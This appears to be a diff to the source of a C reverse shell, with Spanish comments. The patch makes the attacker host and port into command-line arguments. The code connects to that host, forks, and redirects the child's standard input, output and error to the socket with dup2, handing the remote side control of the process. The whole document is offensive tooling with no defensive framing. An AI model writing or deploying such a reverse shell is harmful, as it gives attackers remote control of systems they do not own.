@@ -1,21 +1,21 @@
 #include <stdio.h>
 #include <sys/socket.h>
 #include <sys/types.h>
-#include <stdlib.h>
 #include <unistd.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <signal.h>
 #include <sys/wait.h>
+#include <stdlib.h>
 
 int main(int argc, char** args) {
-    int port = 9001;
+    if (argc != 3)
+        return 1;
+    int port = atoi(args[2]);
     struct sockaddr_in revsockaddr;
 
     signal(SIGCHLD, SIG_IGN);  // Evitar zombies
 
-    if (argc != 2)
-        return 1;
     revsockaddr.sin_family = AF_INET;
     revsockaddr.sin_port = htons(port);
     revsockaddr.sin_addr.s_addr = inet_addr(args[1]);
@@ -30,7 +30,6 @@ int main(int argc, char** args) {
             pid_t pid = fork();
             if (pid == 0) {
                 printf("[*] Proceso hijo creado, redirigiendo I/O...\n");
-
                 dup2(sockt, 0);  // stdin
                 dup2(sockt, 1);  // stdout
                 dup2(sockt, 2);  // stderr
